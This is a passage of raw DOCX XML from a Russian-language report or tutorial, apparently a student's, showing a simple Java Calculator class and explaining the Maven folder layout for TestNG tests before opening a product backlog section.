      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> second;</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    public Calculator(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> first, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> second) {</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>this.first</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> = first;</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>this.second</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> = second;</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    public </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>getResult</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(){</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">      return first * second;</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">         }</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0"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 xml:space="preserve">Положим его туда, где по правилам </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven'а</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> должны лежать исходники, над которыми производятся тесты - папку </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Разумеется, это правило не строгое, так как тесты могут производиться над любым сторонним </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>модулем, находящимся в принципе в другом проекте. Но если мы пишем тесты на работу локально созданного класса, то и находиться он должен в определенном месте.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0"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 xml:space="preserve">Так как Ваш проект был настроен на использование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, то Вам придется следовать некоторым правилами структуризации кода, установленными </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven'ом</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. По ней, все классы с тестами должны быть в папке </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Создайте её, если она не создана. Внутри нее давайте создадим пакет, в котором будут храниться классы с тестами. Внутри пакета - давайте создадим простейший класс теста. Назовем его, скажем, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ОurCoolTest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. В отличии от </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>JUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - у </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>TestNG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> нету строгого правила по поводу названия класса. Но </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>всё таки</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> лучше классы с тестами называть так, чтобы было понятно, для чего они. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">В итоге после всего вышеописанного, структура вашего проекта будет </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>выглядить</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> примерно вот так:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>my-app</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t>|-- pom.xml</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">`-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    `-- main</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        `-- java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            `-- com</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perfecttest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                    `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>somepackage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                        `-- Calculator.java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    `-- test</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        `-- java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            `-- com</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perfecttest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                    `-- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>somepackage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                        `-- OurCoolTest.java</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRPr="00073DDF" w:rsidRDefault="00322095" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRDefault="00F33D0A" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F33D0A">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Проэктирование</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00F33D0A" w:rsidRPr="00F33D0A" w:rsidRDefault="00F33D0A" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>3.1Бэклог продукта</w:t>
      </w:r>
